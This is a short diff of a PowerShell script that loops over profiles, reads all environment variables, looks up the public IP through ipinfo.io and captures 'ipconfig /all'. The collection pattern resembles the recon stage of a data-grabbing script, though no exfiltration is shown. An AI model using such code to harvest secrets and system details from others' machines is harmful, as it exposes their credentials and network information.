@@ -12,9 +12,9 @@ foreach ($profile in $profiles) {
     }
 }
 
-$envVars = Get-ChildItem Env: | ForEach-Object {
+$envVars = gci Env: | ForEach-Object {
     $_.Name, $_.Value
-} | ConvertFrom-Csv -Delimiter '=' -Header Name, Value
+}
 
 $IPV4 = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
 $IPconfig = (ipconfig /all)
